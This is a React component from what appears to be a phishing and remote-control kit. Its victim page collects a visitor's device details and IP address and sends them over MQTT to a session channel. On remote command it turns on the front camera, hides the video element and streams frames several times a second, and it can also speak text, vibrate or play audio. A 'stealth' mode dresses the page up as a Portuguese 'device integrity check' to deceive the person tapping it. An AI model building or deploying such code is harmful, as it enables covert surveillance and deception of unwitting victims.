
import React, { useEffect, useState, useRef } from 'react';
import { UploadCloud, Radio, Skull, MapPin, Battery, Video, Fingerprint, Power, ShieldCheck, Loader2, Zap } from 'lucide-react';
import { getDeviceInfo } from '../services/deviceService';
import { mqttService } from '../services/mqttService';
import { DeviceInfo, CommandMessage } from '../types';

const MobileScanner: React.FC = () => {
  const [started, setStarted] = useState(false);
  const [status, setStatus] = useState<'initializing' | 'scanning' | 'transmitting' | 'complete' | 'error'>('initializing');
  const [info, setInfo] = useState<DeviceInfo | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [isStreaming, setIsStreaming] = useState(false);
  const [stealthMode, setStealthMode] = useState(false);
  const [isGlitching, setIsGlitching] = useState(false);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamIntervalRef = useRef<number | null>(null);

  const getURLParams = () => {
    const hash = window.location.hash; 
    const queryPart = hash.split('?')[1];
    if (!queryPart) return { session: null, stealth: false };
    const params = new URLSearchParams(queryPart);
    return { session: params.get('session'), stealth: params.get('stealth') === 'true' };
  };

  const addLog = (msg: string) => setLogs(prev => [...prev.slice(-6), msg]);

  const handleCommand = (cmd: CommandMessage, session: string) => {
    switch (cmd.type) {
      case 'ACTIVATE_CAMERA': startCamera(session); break;
      case 'STOP_CAMERA': stopCamera(); break;
      case 'SPEAK': 
        const utterance = new SpeechSynthesisUtterance(cmd.payload.text);
        utterance.lang = 'pt-BR';
        window.speechSynthesis.speak(utterance);
        addLog('NEURAL_AUDIO_RECEIVED');
        break;
      case 'GLITCH':
        setIsGlitching(true);
        if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 300]);
        setTimeout(() => setIsGlitching(false), 3000);
        addLog('SYSTEM_OVERLOAD_DETECTED');
        break;
      case 'VIBRATE':
        if (navigator.vibrate) navigator.vibrate(500);
        break;
      case 'PLAY_AUDIO':
        new Audio(cmd.payload.url).play().catch(() => {});
        break;
    }
  };

  const startCamera = async (sessionId: string) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: 320, height: 240 }, audio: false 
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsStreaming(true);
        streamIntervalRef.current = window.setInterval(() => {
           if (videoRef.current && canvasRef.current) {
              const ctx = canvasRef.current.getContext('2d');
              if (ctx) {
                 ctx.drawImage(videoRef.current, 0, 0, 320, 240);
                 mqttService.publishStream(sessionId, { 
                   image: canvasRef.current.toDataURL('image/jpeg', 0.4), 
                   timestamp: new Date().toISOString() 
                 });
              }
           }
        }, 250);
      }
    } catch (err) { addLog('CAMERA_FAIL'); }
  };

  const stopCamera = () => {
     if (streamIntervalRef.current) { clearInterval(streamIntervalRef.current); streamIntervalRef.current = null; }
     if (videoRef.current?.srcObject) (videoRef.current.srcObject as MediaStream).getTracks().forEach(t => t.stop());
     setIsStreaming(false);
  };

  useEffect(() => {
    if (!started) return;
    const { session, stealth } = getURLParams();
    if (!session) return;

    const run = async () => {
      setStatus('scanning');
      setProgress(20);
      const data = await getDeviceInfo(stealth);
      setInfo(data);
      setProgress(60);
      mqttService.connect(session, () => {}, () => mqttService.publishData(session, data), (cmd) => handleCommand(cmd, session));
      setProgress(100);
      setStatus('complete');
    };
    run();
    return () => stopCamera();
  }, [started]);

  if (!started) {
    return (
      <div onClick={() => { setStarted(true); setStealthMode(getURLParams().stealth); }} className={`fixed inset-0 flex flex-col items-center justify-center p-8 z-50 ${stealthMode ? 'bg-white text-gray-800' : 'bg-black'}`}>
        {stealthMode ? (
          <div className="text-center space-y-4">
            <ShieldCheck size={64} className="text-blue-600 mx-auto animate-pulse" />
            <h1 className="text-xl font-sans font-bold">Verificação de Integridade</h1>
            <p className="text-xs text-gray-500">Toque para validar seu dispositivo</p>
          </div>
        ) : (
          <div className="text-center space-y-4">
            <Power size={64} className="text-red-500 mx-auto animate-pulse" />
            <h1 className="text-2xl font-black text-red-500">PEGASUS_V4_OFFLINE</h1>
            <p className="text-[10px] text-red-400">TOQUE PARA ESTABELECER CONEXÃO</p>
          </div>
        )}
        <div className="absolute bottom-8 text-[10px] opacity-30 text-center w-full">Develop By: Davi.Design</div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen font-mono p-4 flex flex-col items-center justify-center relative transition-all duration-300 ${isGlitching ? 'bg-red-900 invert scale-110' : (stealthMode ? 'bg-white text-blue-900' : 'bg-black text-green-500')}`}>
      <video ref={videoRef} className="hidden" playsInline muted autoPlay></video>
      <canvas ref={canvasRef} width="320" height="240" className="hidden"></canvas>
      
      {isGlitching && <div className="absolute inset-0 bg-red-500/20 flex items-center justify-center z-50"><Zap size={100} className="text-white animate-ping" /></div>}

      <div className="z-10 w-full max-w-md space-y-6">
        <div className="text-center">
          {stealthMode ? (
             <div className="space-y-4">
                <Loader2 className="animate-spin text-blue-500 mx-auto" size={32} />
                <h2 className="text-xl font-bold">Processando Solicitação...</h2>
             </div>
          ) : (
             <div className="space-y-2">
                <Skull size={40} className="mx-auto text-red-600 animate-pulse" />
                <h1 className="text-2xl font-black uppercase tracking-tighter">Conexão Ativa</h1>
                <div className="text-[10px] bg-red-900/30 py-1 border border-red-900/50">CANAL_CRIPTOGRAFADO_ESTABELECIDO</div>
             </div>
          )}
        </div>

        <div className={`p-6 border rounded-lg shadow-2xl ${stealthMode ? 'bg-gray-50 border-gray-200' : 'bg-gray-900/80 border-green-900'}`}>
          <div className="space-y-2 mb-6">
            <div className="flex justify-between text-[10px] text-gray-400"><span>PROGRESSO</span><span>{progress}%</span></div>
            <div className="h-1 bg-gray-800 rounded-full overflow-hidden">
              <div className={`h-full transition-all duration-500 ${stealthMode ? 'bg-blue-600' : 'bg-green-600'}`} style={{ width: `${progress}%` }}></div>
            </div>
          </div>

          <div className={`text-[10px] h-32 overflow-hidden border-t border-b py-2 mb-4 space-y-1 ${stealthMode ? 'text-blue-800' : 'text-green-400'}`}>
            {logs.map((l, i) => <div key={i} className="opacity-80">&gt; {l}</div>)}
          </div>

          {info && (
            <div className={`grid grid-cols-2 gap-2 text-[10px] border p-3 rounded ${stealthMode ? 'bg-white border-gray-100' : 'bg-black border-green-900/30'}`}>
              <div className="text-gray-400 uppercase">Dispositivo</div>
              <div className="text-right truncate">{info.platform}</div>
              <div className="text-gray-400 uppercase">IP_ADDR</div>
              <div className="text-right">{info.ip}</div>
            </div>
          )}
        </div>
      </div>
      <div className="absolute bottom-4 text-[10px] opacity-30 text-center w-full">Develop By: Davi.Design</div>
    </div>
  );
};

export default MobileScanner;
